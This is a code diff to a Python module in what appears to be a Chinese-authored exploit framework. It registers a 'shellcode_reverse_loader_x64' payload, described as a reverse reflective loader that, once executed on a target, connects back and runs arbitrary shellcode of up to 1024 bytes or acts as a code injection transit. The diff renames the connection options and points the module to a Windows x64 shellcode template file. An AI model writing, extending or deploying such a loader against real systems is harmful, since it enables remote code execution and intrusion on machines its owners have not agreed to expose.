@@ -9,15 +9,27 @@ class Payload(BGExploit):
         
     def __init__(self):
         super(self.__class__, self).__init__()
-
+        
+        self.register_info({
+            "Info":{
+                "Name":"shellcode_reverse_loader_x64",
+                "Author":"Mosin",
+                "Type":"Reverse",
+                "Ref":"----",
+                "Version":"1.0",
+                "Desc":"This is Reverse ReflectiveLoader. After the program execution on the target,it is necessary to use locally Shellcode handler\n"+
+                "to monitor module to communicate, after connection,you can send any Shellcode can run within the size of 1024 bytes of Shellcode, \n"+
+                "otherwise an error cause unable to perform, you can also use this way as a code injection transit."
+            }
+        })
         #自定义显示参数
         self.register_option({
-            "LHOST": {
+            "RHOST": {
                 "default": "127.0.0.1",
                 "desc": "目标IP",
                 "Required":"no"
             },
-            "LPORT": {
+            "RPORT": {
                 "default": "4444",
                 "desc": "目标端口",
                 "Required":"no"
@@ -71,7 +83,7 @@ class Payload(BGExploit):
     #打开文件
     def open_file(self):
         try:
-            f = open('lib/soure/data/shellcode_loader.shell','r')
+            f = open('lib/soure/data/win_shellcode_loader_x64.shell','r')
             file_data = f.read()
         except:
             print "[-] TempleteFile Open Fail"
